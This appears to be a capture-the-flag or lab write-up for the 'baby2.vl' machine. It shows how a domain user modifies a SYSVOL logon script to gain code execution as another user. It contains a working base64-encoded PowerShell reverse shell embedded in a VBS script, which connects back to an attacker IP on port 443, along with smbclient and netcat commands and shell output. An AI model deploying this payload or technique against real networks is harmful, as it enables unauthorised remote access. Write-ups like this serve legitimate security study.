
We can potentially modify logonscripts to get RCE as an domain user. 

**NOTE:** Even when nxc doesn't show that we have write permissions on the SYSVOL Share, we could still have them, due to ACL's. Try it manually with the following PoC: 

---

1. Enumerate Logonscripts of users using LDAP or inspect them in BloodHound.

```
cat ldapsearch.txt | grep -i -B 20 scriptPath
```

I analyzed all of the other user's and identified that user "Amelia.Griffith" has an interesting .vbs script as logon script set in SYSVOL! The Issue is that I don't have write permissions there.

```
Logonscript:
\\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
```

2. Connected to SYSVOL SMB Share

```
smbclient \\\\baby2.vl/SYSVOL -U library
Password for [WORKGROUP\library]:
Try "help" to get a list of possible commands.
smb: \>
```

Since checking write permissions in SMB Shares using nxc isn't 100% correct, because there could be custom DACL's which allow our current user to modify the login.vbs. 

3. We'll download the login.vbs file onto local machine, add some input on top of it for example an .ps1 reverse shell script and then try & put it back again. This could grant us an reverse shell as user "Amelia.Griffith"!

```
smb: \baby2.vl\scripts\> get login.vbs
```

4. I've added this payload inside of the login.vbs script on my local machine, I generated it using revshells.com and oriented myself of 0xdf's writeup.

```
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

5. Started up my listener on port 443.

```
rlwrap nc -lvnp 443
```

6. Connected to the SYSVOL SMB Share again and it actually worked! I put the login.vbs file inside and replaced it basically with the current one. This confirms our current user library having some sort of write permissions, which isn't being displayed by nxc.

```
smb: \baby2.vl\scripts\> put login.vbs 
putting file login.vbs as \baby2.vl\scripts\login.vbs (20.9 kB/s) (average 20.9 kB/s)
```

After some time I gained RCE as user "amelia.griffiths".

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.76.122] 63006
whoami
baby2\amelia.griffiths
```
